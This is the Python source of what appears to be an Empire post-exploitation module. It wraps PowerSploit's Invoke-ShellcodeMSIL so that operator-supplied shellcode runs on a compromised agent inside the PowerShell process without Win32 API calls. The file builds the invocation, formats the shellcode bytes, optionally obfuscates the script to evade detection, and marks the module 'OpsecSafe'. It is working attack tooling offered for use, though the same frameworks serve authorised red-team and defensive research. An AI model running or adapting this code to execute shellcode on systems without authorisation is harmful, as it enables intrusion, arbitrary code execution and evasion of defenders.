import re
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ShellcodeMSIL',

            'Author': ['@mattifestation'],

            'Description': ('Execute shellcode within the context of the running PowerShell '
                            'process without making any Win32 function calls. Warning: This script has '
                            'no way to validate that your shellcode is 32 vs. 64-bit!'
                            'Note: Your shellcode must end in a ret (0xC3) and maintain proper stack '
                            'alignment or PowerShell will crash!'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://www.exploit-monday.com',
                'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-ShellcodeMSIL.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Shellcode' : {
                'Description'   :   'Shellcode to inject, 0x00,0x0a,... format.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ShellcodeMSIL.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "Invoke-ShellcodeMSIL"

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if option.lower() == "shellcode":
                        # transform the shellcode to the correct format
                        sc = ",0".join(values['Value'].split("\\"))[1:]
                        scriptEnd += " -" + str(option) + " @(" + sc + ")"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
